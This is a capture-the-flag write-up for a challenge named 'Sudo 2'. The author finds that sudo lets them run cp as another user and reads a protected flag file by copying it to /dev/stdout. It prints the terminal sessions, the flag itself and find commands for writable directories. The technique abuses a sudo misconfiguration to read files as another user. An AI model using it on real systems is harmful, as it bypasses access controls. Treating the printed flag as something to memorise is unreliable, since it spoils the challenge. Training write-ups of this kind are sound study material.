# Sudo 2

## Write-UP

When intering the instance, we can find the `flag.txt` file in the current directory, but unfortunatly, we can't read it. Let's find out what we can do sith sudo :

```
ctf@sudo-2-796c46749d-phhfg:~$ sudo -l
Matching Defaults entries for ctf on sudo-2-796c46749d-phhfg:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ctf may run the following commands on sudo-2-796c46749d-phhfg:
    (ctf-cracked) /usr/bin/cp
```

As we can see here, we can execute `cp` command with the `ctf-cracked` user priviledges, so we can read the file with those priviledges. The only thing remainning is to find a right destination to copy to

```
ctf@sudo-2-796c46749d-phhfg:~$ ls -l /
total 56
lrwxrwxrwx   1 root root    7 Nov 30 02:04 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Apr 18  2022 boot
drwxr-xr-x   5 root root  360 Dec 21 11:47 dev
drwxr-xr-x   1 root root 4096 Dec 20 19:25 etc
drwxr-xr-x   1 root root 4096 Dec 20 19:25 home
lrwxrwxrwx   1 root root    7 Nov 30 02:04 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Nov 30 02:04 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Nov 30 02:04 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Nov 30 02:04 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4096 Nov 30 02:04 media
drwxr-xr-x   2 root root 4096 Nov 30 02:04 mnt
drwxr-xr-x   2 root root 4096 Nov 30 02:04 opt
dr-xr-xr-x 254 root root    0 Dec 21 11:47 proc
drwx------   2 root root 4096 Nov 30 02:07 root
drwxr-xr-x   1 root root 4096 Dec 21 23:32 run
lrwxrwxrwx   1 root root    8 Nov 30 02:04 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Nov 30 02:04 srv
dr-xr-xr-x  13 root root    0 Dec 21 11:47 sys
d-wx-wx-wt   1 root root 4096 Dec 21 22:39 tmp
drwxr-xr-x   1 root root 4096 Nov 30 02:04 usr
drwxr-xr-x   1 root root 4096 Nov 30 02:07 var
```

Unfortunatly, no destination is available for us to copy to, for example :

```
ctf@sudo-2-796c46749d-phhfg:~$ sudo -u ctf-cracked cp ./flag.txt /usr
cp: cannot create regular file '/usr/flag.txt': Permission denied
```

But, with a little trick, we can actually instead of copying to a certain destination, stdout the content of the file :

```
ctf@sudo-2-796c46749d-rnksq:~$ sudo -u ctf-cracked cp ./flag.txt /dev/stdout
[sudo] password for ctf: 
shellmates{Y0u_do1ng_Job_W1Th_suDO_L3TS_$3e_For_TH3_N3XT_On3}
```

**Note :** note that you can copy the `flag.txt` to other folders like :
 
 - `/tmp`
 - `/dev/shm`
 - `/run/lock`

But unfortunatly, can't be read :

```
ctf@sudo-2-796c46749d-sz72m:~$ sudo -u ctf-cracked cp /home/ctf/flag.txt /tmp
[sudo] password for ctf
ctf@sudo-2-796c46749d-sz72m:~$ cat /tmp/flag.txt
cat: /tmp/flag.txt: Permission denied
ctf@sudo-2-796c46749d-sz72m:~$ chmod 777 /tmp/flag.txt
chmod: changing permissions of '/tmp/flag.txt': Operation not permitted
ctf@sudo-2-796c46749d-sz72m:~$ ls -l /tmp
ls: cannot open directory '/tmp': Permission denied
```

```
ctf@sudo-2-796c46749d-sz72m:~$ sudo -u ctf-cracked cp /home/ctf/flag.txt /dev/shm
ctf@sudo-2-796c46749d-sz72m:~$ ls -l /dev/shm
total 4
-r-------- 1 ctf-cracked ctf-cracked 61 Dec 26 19:24 flag.txt
ctf@sudo-2-796c46749d-sz72m:~$ cat /dev/shm/flag.txt
cat: /dev/shm/flag.txt: Permission denied
```


## Flag

shellmates{Y0u_do1ng_Job_W1Th_suDO_L3TS_$3e_For_TH3_N3XT_On3}

## More Information

https://askubuntu.com/questions/746818/terminal-list-all-directories-for-which-a-user-or-group-has-write-permission
```
ctf@sudo-2-796c46749d-phhfg:~$ find -type d \( \( -user ctf-cracked -perm /u=w \) -o \( -group ctf-cracked -perm /g=w \) -o -perm /o=w \)
ctf@sudo-2-796c46749d-phhfg:~$ find -type d \( \( -user ctf -perm /u=w \) -o \( -group ctf -perm /g=w \) -o -perm /o=w \)
```

```
find -type d \( \( -user ctf -perm /u=w \) -o \( -group ctf -perm /g=w \) \)
```